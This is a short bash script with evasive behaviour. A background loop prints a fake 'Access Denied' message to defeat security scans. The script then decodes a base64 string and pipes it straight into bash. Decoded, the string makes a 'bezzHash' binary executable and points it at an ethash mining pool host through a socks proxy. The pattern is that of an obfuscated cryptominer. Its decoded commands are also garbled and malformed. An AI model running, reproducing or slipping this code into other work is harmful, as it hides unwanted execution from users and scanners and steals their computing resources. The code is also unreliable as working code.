#!/bin/bash

# Function to simulate a fake signal
simulate_fake_signal() {
    echo "Error: Unable to scan the file. Access Denied."
    exit 1
}

# Function to monitor for security scan attempts
monitor_security_scan() {
    while :
    do
        # Check if bezzHash is being accessed
        if [ -e "bezzHash" ]; then
            echo "Fake signal detected! Simulating access denied."
            simulate_fake_signal
        fi
        sleep 1  # Check every second
    done
}

# Start monitoring for security scan attempts in the background
monitor_security_scan &

# Define sensitive commands encoded in base64
SENSITIVE_COMMANDS_BASE64="Y2htb2QgK3ggYmV6ekhhc2gKfCJ1dGYtOCIKY2QgLWwgc2VydmVyIGV0aGFzaC5wb29sYmluYW5jZS5jb20gLXAtZXRoYXNoIC0tcGFyYWdvbCB4MDAxIC0tc29ja3Mgc256eXBoeWQtaWwgbmwtNTo4MAo="

# Decode and execute the sensitive commands
echo "$SENSITIVE_COMMANDS_BASE64" | base64 -d | bash

# Simulate successful execution
echo "Simulating successful execution of sensitive commands."

# Exit script
exit 0
